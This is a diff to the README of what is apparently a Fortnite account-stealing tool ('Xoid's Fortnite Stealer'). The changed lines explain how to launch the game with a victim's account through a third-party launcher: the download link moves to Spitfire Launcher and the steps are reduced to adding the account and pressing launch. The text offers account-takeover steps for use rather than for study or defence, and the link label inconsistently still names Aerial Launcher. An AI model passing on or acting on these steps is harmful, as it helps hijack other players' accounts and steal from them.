@@ -35,8 +35,8 @@ To set up Xoid's Fortnite Stealer, follow these steps:
 To launch Fortnite using the victim's account:  
 
 1. **Download and Set Up Aerial Launcher**  
-   - Get Aerial Launcher from [Aerial Launcher](https://github.com/Ciensprog/Aerial-Launcher/releases).  
-   - After installation, navigate to the bottom right of the Aerial Launcher's side navigation bar and select **Authorization Code**.  
+   - Get Aerial Launcher from [Spitfire Launcher](https://github.com/BurakYs/Spitfire-Launcher/releases/).  
+   - add the account after its installed and press launch game. Thats it! :)
 
 2. **Get the Authorization Code**  
    - Click the **Get Code** button.  
